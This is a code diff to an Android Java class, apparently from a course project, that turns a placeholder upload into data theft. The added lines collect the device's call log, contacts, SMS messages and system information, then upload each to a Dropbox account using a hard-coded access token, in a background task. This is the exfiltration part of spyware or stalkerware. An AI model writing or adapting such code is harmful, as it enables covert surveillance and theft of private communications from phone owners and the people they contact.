@@ -10,9 +10,15 @@ import java.io.ByteArrayInputStream;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
 
-import static yalimov.course.Constants.DBX_ACCESS_TOKEN;
+import yalimov.course.collectors.CallsCollector;
+import yalimov.course.collectors.ContactCollector;
+import yalimov.course.collectors.MessagesCollector;
+import yalimov.course.collectors.SystemCollector;
 
-class UploadTask extends AsyncTask<String, Void, FileMetadata>
+import static yalimov.course.Common.DBX_ACCESS_TOKEN;
+
+
+public class UploadTask extends AsyncTask<String, Void, FileMetadata>
 {
 
     private Exception mException;
@@ -33,13 +39,20 @@ class UploadTask extends AsyncTask<String, Void, FileMetadata>
     @Override
     protected FileMetadata doInBackground(String... params)
     {
-
         try
         {
             DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/mobile_2").build();
             client = new DbxClientV2(config, DBX_ACCESS_TOKEN);
-            InputStream in = new ByteArrayInputStream("".getBytes(StandardCharsets.UTF_8));
-            FileMetadata metadata = client.files().uploadBuilder("/test_" + Integer.toString(1) + ".txt").uploadAndFinish(in);
+
+            InputStream CallsInfo    = new ByteArrayInputStream(CallsCollector.getCallsLog().getBytes(StandardCharsets.UTF_8));
+            InputStream ContactInfo  = new ByteArrayInputStream(ContactCollector.getContactsLog().getBytes(StandardCharsets.UTF_8));
+            InputStream MessagesInfo = new ByteArrayInputStream(MessagesCollector.getMessagesLog().getBytes(StandardCharsets.UTF_8));
+            InputStream SystemInfo   = new ByteArrayInputStream(SystemCollector.getSystemLog().getBytes(StandardCharsets.UTF_8));
+
+            client.files().uploadBuilder("/CallsLog.txt").uploadAndFinish(CallsInfo);
+            client.files().uploadBuilder("/ContactsLog.txt").uploadAndFinish(ContactInfo);
+            client.files().uploadBuilder("/MessagesLog.txt").uploadAndFinish(MessagesInfo);
+            client.files().uploadBuilder("/SystemLog.txt").uploadAndFinish(SystemInfo);
         }
         catch (Exception ex)
         {
